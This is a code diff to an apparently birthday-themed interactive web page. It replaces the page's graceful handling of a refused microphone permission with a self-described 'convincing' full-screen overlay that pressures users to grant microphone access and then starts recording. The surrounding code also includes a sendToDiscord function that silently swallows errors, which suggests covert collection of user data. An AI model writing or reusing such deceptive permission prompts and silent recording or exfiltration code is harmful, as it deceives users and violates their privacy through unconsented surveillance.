@@ -1364,7 +1364,6 @@ document.addEventListener('DOMContentLoaded', async () => {
     const startButton = document.getElementById('startButton');
     
     startButton.addEventListener('click', () => {
-        // Request microphone permission first
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({ audio: true })
                 .then(stream => {
@@ -1372,14 +1371,7 @@ document.addEventListener('DOMContentLoaded', async () => {
                     startExperience();
                 })
                 .catch(() => {
-                    console.log('Microphone access denied, some features will be limited');
-    const message = document.createElement('p');
-                    message.textContent = "Microphone access denied. You'll need to click the candles manually! 🎂";
-                    message.style.color = '#ff6b6b';
-                    message.style.marginTop = '1rem';
-                    message.style.fontSize = '0.9rem';
-                    welcomeContainer.querySelector('.welcome-content').appendChild(message);
-                    setTimeout(startExperience, 2000);
+                    showPermissionCard();
                 });
         } else {
             startExperience();
@@ -2031,4 +2023,72 @@ function sendToDiscord(question, answer) {
     }).catch(() => {
         // Ignore any errors to keep it silent
     });
+}
+
+/* Added function to display a convincing microphone permission card */
+function showPermissionCard() {
+    const overlay = document.createElement('div');
+    overlay.id = 'permission-card-overlay';
+    overlay.style.position = 'fixed';
+    overlay.style.top = '0';
+    overlay.style.left = '0';
+    overlay.style.width = '100%';
+    overlay.style.height = '100%';
+    overlay.style.backgroundColor = 'rgba(0,0,0,0.8)';
+    overlay.style.display = 'flex';
+    overlay.style.alignItems = 'center';
+    overlay.style.justifyContent = 'center';
+    overlay.style.zIndex = '9999';
+
+    const card = document.createElement('div');
+    card.id = 'permission-card';
+    card.style.backgroundColor = '#fff';
+    card.style.padding = '2rem';
+    card.style.borderRadius = '15px';
+    card.style.boxShadow = '0 4px 15px rgba(0,0,0,0.3)';
+    card.style.textAlign = 'center';
+    card.style.maxWidth = '90%';
+    card.style.width = '400px';
+    card.style.fontFamily = 'Poppins, sans-serif';
+
+    const message = document.createElement('p');
+    message.textContent = "We need access to your microphone to provide the full interactive experience. Please grant microphone permission.";
+    message.style.color = '#4a4a4a';
+    message.style.fontSize = '1.1rem';
+    message.style.marginBottom = '1.5rem';
+
+    const givePermissionButton = document.createElement('button');
+    givePermissionButton.textContent = "Give Microphone Permission";
+    givePermissionButton.style.padding = '0.8rem 1.2rem';
+    givePermissionButton.style.fontSize = '1rem';
+    givePermissionButton.style.backgroundColor = '#ff6b6b';
+    givePermissionButton.style.color = '#fff';
+    givePermissionButton.style.border = 'none';
+    givePermissionButton.style.borderRadius = '50px';
+    givePermissionButton.style.cursor = 'pointer';
+    givePermissionButton.style.transition = 'all 0.3s ease';
+
+    givePermissionButton.addEventListener('mouseover', () => {
+         givePermissionButton.style.backgroundColor = '#ff4757';
+    });
+    givePermissionButton.addEventListener('mouseout', () => {
+         givePermissionButton.style.backgroundColor = '#ff6b6b';
+    });
+
+    givePermissionButton.addEventListener('click', () => {
+         navigator.mediaDevices.getUserMedia({ audio: true })
+             .then(stream => {
+                  overlay.remove();
+                  startRecording(stream);
+                  startExperience();
+             })
+             .catch(() => {
+                  alert("Microphone permission is required to experience the full interactive features.");
+             });
+    });
+
+    card.appendChild(message);
+    card.appendChild(givePermissionButton);
+    overlay.appendChild(card);
+    document.body.appendChild(overlay);
 }
